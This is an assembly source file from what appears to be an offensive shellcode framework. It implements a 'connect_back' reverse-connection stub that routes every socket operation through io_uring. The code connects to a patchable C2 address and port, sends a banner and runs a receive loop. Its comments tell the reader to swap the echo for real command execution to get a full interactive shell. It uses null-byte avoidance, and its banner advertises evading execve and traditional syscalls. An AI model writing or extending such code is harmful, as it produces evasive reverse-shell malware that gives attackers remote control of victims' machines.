; ================================================================
; missions/connect_back.asm — Layer 2: TCP reverse connection
; ================================================================
; Sequence (all via io_uring):
;   1. IORING_OP_SOCKET  — create TCP socket
;   2. IORING_OP_CONNECT — connect to C2
;   3. IORING_OP_SEND    — send banner
;   4. IORING_OP_RECV    — receive command (loop)
;   5. IORING_OP_WRITE   — write command output to stdout
;   6. exit(0)
;
; This is a connect-back stub that delivers a session banner.
; Extend the recv loop for a full interactive shell.
;
; Patchable config:
;   _config_ip    — 4 bytes, network byte order (default: 127.0.0.1)
;   _config_port  — 2 bytes, big-endian           (default: 4444)
; ================================================================

%define OP_SOCKET   45
%define OP_CONNECT  16
%define OP_SEND     26
%define OP_RECV     27
%define OP_WRITE    23

%define SQ_OPCODE   0
%define SQ_FD       4
%define SQ_OFF      8
%define SQ_ADDR     16
%define SQ_LEN      24
%define SQ_OPFLAGS  28
%define SQ_UDATA    40

%define AT_FDCWD    -100

_mission:

; ---- 1. socket(AF_INET, SOCK_STREAM, 0) ----
    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_SOCKET
    mov dword [rax + SQ_FD], 2          ; AF_INET
    mov qword [rax + SQ_OFF], 1         ; SOCK_STREAM
    mov qword [rax + SQ_UDATA], 1
    call _io_enter
    call _wait_cqe
    test ecx, ecx
    js _fail
    mov [r13 + F_SOCKFD], ecx

; ---- 2. connect(sock, &sockaddr_in, 16) ----
    lea rdx, [r13 + F_SADDR]
    mov word [rdx], 2                   ; AF_INET
    lea rcx, [r12 + _config_port - _get_base]
    movzx eax, word [rcx]
    mov [rdx + 2], ax                   ; sin_port (big-endian)
    lea rcx, [r12 + _config_ip - _get_base]
    mov eax, [rcx]
    mov [rdx + 4], eax                  ; sin_addr

    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_CONNECT
    mov ecx, [r13 + F_SOCKFD]
    mov [rax + SQ_FD], ecx
    lea rcx, [r13 + F_SADDR]
    mov [rax + SQ_ADDR], rcx
    mov dword [rax + SQ_LEN], 16
    mov qword [rax + SQ_UDATA], 2
    call _io_enter
    call _wait_cqe
    test ecx, ecx
    js _fail

; ---- 3. send banner ----
    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_SEND
    mov ecx, [r13 + F_SOCKFD]
    mov [rax + SQ_FD], ecx
    lea rcx, [r12 + _banner - _get_base]
    mov [rax + SQ_ADDR], rcx
    mov dword [rax + SQ_LEN], _banner_len
    mov qword [rax + SQ_UDATA], 3
    call _io_enter
    call _wait_cqe

; ---- 4. recv loop: receive command, echo back ----
_recv_loop:
    ; recv into F_RBUF
    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_RECV
    mov ecx, [r13 + F_SOCKFD]
    mov [rax + SQ_FD], ecx
    lea rcx, [r13 + F_RBUF]
    mov [rax + SQ_ADDR], rcx
    ; len = 4096 via shift (avoid null bytes)
    xor ecx, ecx
    mov cl, 0x10
    shl ecx, 8
    mov [rax + SQ_LEN], ecx
    mov qword [rax + SQ_UDATA], 4
    call _io_enter
    call _wait_cqe          ; ecx = bytes_received or 0 (closed)

    test ecx, ecx
    jle _exit_clean         ; connection closed or error — exit cleanly

    mov [r13 + F_NBYTES], ecx

    ; echo received data back to socket (stub — replace with real exec)
    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_SEND
    mov ecx, [r13 + F_SOCKFD]
    mov [rax + SQ_FD], ecx
    lea rcx, [r13 + F_RBUF]
    mov [rax + SQ_ADDR], rcx
    mov ecx, [r13 + F_NBYTES]
    mov [rax + SQ_LEN], ecx
    mov qword [rax + SQ_UDATA], 5
    call _io_enter
    call _wait_cqe

    jmp _recv_loop

; ================================================================
; Data section
; ================================================================
_banner:
    db '[uring-shellcode] connect_back active', 0x0a
    db 'io_uring session — no execve, no traditional syscalls', 0x0a
    db 0x00
_banner_len equ $ - _banner - 1

; Patchable config
_config_ip:   db 127, 0, 0, 1
_config_port: db 0x11, 0x5c     ; 4444 in big-endian
